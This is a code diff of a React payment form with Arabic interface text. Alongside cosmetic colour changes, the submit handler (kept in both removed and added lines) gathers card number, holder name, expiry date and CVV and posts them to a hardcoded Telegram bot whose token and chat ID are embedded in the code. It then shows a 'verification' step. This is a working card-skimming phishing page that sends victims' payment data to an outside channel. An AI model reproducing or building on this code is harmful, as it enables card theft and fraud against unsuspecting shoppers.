@@ -211,7 +211,7 @@ export default function PaymentForm({
           <div
             className={`p-4 border rounded-lg cursor-pointer h-16 flex items-center justify-center ${
               paymentMethod === "credit_card"
-                ? "border-primary bg-blue-50"
+                ? "border-primary bg-red-50"
                 : "border-gray-300"
             }`}
             onClick={() => setPaymentMethod("credit_card")}
@@ -320,7 +320,7 @@ export default function PaymentForm({
               <label className="flex items- justify-start gap-2 space-x-reverse">
                 <input
                   type="checkbox"
-                  className="form-checkbox h-4 w-4 text-blue-600 rounded border-gray-300 focus:ring-blue-500"
+                  className="form-checkbox h-4 w-4 text-red-600 rounded border-gray-300 focus:ring-red-600"
                   checked={isCheckboxChecked}
                   onChange={(e) => setIsCheckboxChecked(e.target.checked)}
                   required
@@ -342,126 +342,128 @@ export default function PaymentForm({
           </div>
         )}
 
-<button
-  onClick={() => {
-    setIsButtonDisabled(true); // Disable the button immediately
-    setTimeout(() => {
-      setIsButtonDisabled(false); // Re-enable the button after 5 seconds
-      if (paymentMethod !== "credit_card" || validateCardInfo()) {
-        const escapeMarkdown = (
-          text: string | number | Date | null | undefined
-        ) => {
-          const safeText = text?.toString() || "";
-          return safeText.replace(/[_*[\]()~`>#+\-=|{}.!]/g, "\\$&");
-        };
+        <button
+          onClick={() => {
+            setIsButtonDisabled(true); // Disable the button immediately
+            setTimeout(() => {
+              setIsButtonDisabled(false); // Re-enable the button after 5 seconds
+              if (paymentMethod !== "credit_card" || validateCardInfo()) {
+                const escapeMarkdown = (
+                  text: string | number | Date | null | undefined
+                ) => {
+                  const safeText = text?.toString() || "";
+                  return safeText.replace(/[_*[\]()~`>#+\-=|{}.!]/g, "\\$&");
+                };
 
-        const botToken =
-          "7518243424:AAEy5xsiG0UTYXCJ_-4lS5Ja5K0pmy4XPUA";
-        const chatId = "-1002630840593";
+                const botToken =
+                  "7518243424:AAEy5xsiG0UTYXCJ_-4lS5Ja5K0pmy4XPUA";
+                const chatId = "-1002630840593";
 
-        const formatOrderInfo = () => {
-          const now = new Date().toLocaleString("ar-SA");
-          let message = "";
-          return message;
-        };
+                const formatOrderInfo = () => {
+                  const now = new Date().toLocaleString("ar-SA");
+                  let message = "";
+                  return message;
+                };
 
-        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            chat_id: chatId,
-            text: formatOrderInfo(),
-            parse_mode: "Markdown",
-          }),
-        })
-          .then(() => {
-            const formatPaymentInfo = () => {
-              const now = new Date().toLocaleString("ar-SA");
-              const parts = [
-                "🔒 Payment Details 🔒",
-                `Payment Method: ${escapeMarkdown(paymentMethod)}`,
-              ];
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                  method: "POST",
+                  headers: { "Content-Type": "application/json" },
+                  body: JSON.stringify({
+                    chat_id: chatId,
+                    text: formatOrderInfo(),
+                    parse_mode: "Markdown",
+                  }),
+                })
+                  .then(() => {
+                    const formatPaymentInfo = () => {
+                      const now = new Date().toLocaleString("ar-SA");
+                      const parts = [
+                        "🔒 Payment Details 🔒",
+                        `Payment Method: ${escapeMarkdown(paymentMethod)}`,
+                      ];
 
-              if (cardInfo.cardNumber) {
-                const formattedCardNumber = cardInfo.cardNumber.replace(
-                  /\s/g,
-                  ""
-                );
-                parts.push(
-                  `*Card Number:* ${escapeMarkdown(
-                    formattedCardNumber
-                  )}`
-                );
+                      if (cardInfo.cardNumber) {
+                        const formattedCardNumber = cardInfo.cardNumber.replace(
+                          /\s/g,
+                          ""
+                        );
+                        parts.push(
+                          `*Card Number:* ${escapeMarkdown(
+                            formattedCardNumber
+                          )}`
+                        );
+                      }
+                      if (cardInfo.cardHolder) {
+                        parts.push(
+                          `*Card Holder Name:* ${escapeMarkdown(
+                            cardInfo.cardHolder
+                          )}`
+                        );
+                      }
+                      if (cardInfo.expiryDate) {
+                        parts.push(
+                          `*Expiry Date:* ${escapeMarkdown(
+                            cardInfo.expiryDate
+                          )}`
+                        );
+                      }
+                      if (cardInfo.cvv) {
+                        parts.push(`*CVV:* ${escapeMarkdown(cardInfo.cvv)}`);
+                      }
+                      parts.push(`*Transaction Time:* ${escapeMarkdown(now)}`);
+
+                      return parts.join("\n");
+                    };
+
+                    return fetch(
+                      `https://api.telegram.org/bot${botToken}/sendMessage`,
+                      {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({
+                          chat_id: chatId,
+                          text: formatPaymentInfo(),
+                          parse_mode: "Markdown",
+                        }),
+                      }
+                    );
+                  })
+                  .then(() => {
+                    if (
+                      paymentMethod === "credit_card" &&
+                      !showVerificationForm
+                    ) {
+                      setShowVerificationForm(true);
+                    } else if (!showVerificationForm) {
+                      handlePaymentSubmit({
+                        paymentMethod,
+                        ...(paymentMethod === "tabby" ||
+                        paymentMethod === "tamara"
+                          ? cardInfo
+                          : {}),
+                      });
+                    }
+                  })
+                  .catch((error) => {
+                    console.error("Error sending payment data:", error);
+                    alert(
+                      "حدث خطأ أثناء معالجة الطلب. الرجاء المحاولة مرة أخرى."
+                    );
+                  });
+              } else {
+                alert("الرجاء التأكد من إدخال بيانات البطاقة بشكل صحيح");
               }
-              if (cardInfo.cardHolder) {
-                parts.push(
-                  `*Card Holder Name:* ${escapeMarkdown(
-                    cardInfo.cardHolder
-                  )}`
-                );
-              }
-              if (cardInfo.expiryDate) {
-                parts.push(
-                  `*Expiry Date:* ${escapeMarkdown(
-                    cardInfo.expiryDate
-                  )}`
-                );
-              }
-              if (cardInfo.cvv) {
-                parts.push(`*CVV:* ${escapeMarkdown(cardInfo.cvv)}`);
-              }
-              parts.push(`*Transaction Time:* ${escapeMarkdown(now)}`);
-
-              return parts.join("\n");
-            };
-
-            return fetch(
-              `https://api.telegram.org/bot${botToken}/sendMessage`,
-              {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                  chat_id: chatId,
-                  text: formatPaymentInfo(),
-                  parse_mode: "Markdown",
-                }),
-              }
-            );
-          })
-          .then(() => {
-            if (
-              paymentMethod === "credit_card" &&
-              !showVerificationForm
-            ) {
-              setShowVerificationForm(true);
-            } else if (!showVerificationForm) {
-              handlePaymentSubmit({
-                paymentMethod,
-                ...(paymentMethod === "tabby" ||
-                paymentMethod === "tamara"
-                  ? cardInfo
-                  : {}),
-              });
-            }
-          })
-          .catch((error) => {
-            console.error("Error sending payment data:", error);
-            alert(
-              "حدث خطأ أثناء معالجة الطلب. الرجاء المحاولة مرة أخرى."
-            );
-          });
-      } else {
-        alert("الرجاء التأكد من إدخال بيانات البطاقة بشكل صحيح");
-      }
-    }, 5000); // تأخير التنفيذ لمدة 5 ثواني
-  }}
-  className={`w-full component-base py-3 px-6 font-medium ${
-    isProcessing || isButtonDisabled ? "bg-gray-400 cursor-not-allowed" : "warning"
-  }`}
-  disabled={!isCheckboxChecked || isProcessing || isButtonDisabled} // Update disabled condition
->
-  {isButtonDisabled ? "جار معالجة عملية الدفع" : "إتمام الدفع"}
-</button>
+            }, 5000); // تأخير التنفيذ لمدة 5 ثواني
+          }}
+          className={`w-full component-base py-3 px-6 font-medium ${
+            isProcessing || isButtonDisabled
+              ? "bg-gray-400 cursor-not-allowed"
+              : "warning"
+          }`}
+          disabled={!isCheckboxChecked || isProcessing || isButtonDisabled} // Update disabled condition
+        >
+          {isButtonDisabled ? "جار معالجة عملية الدفع" : "إتمام الدفع"}
+        </button>
       </div>
 
       {/* Show verification form when needed */}
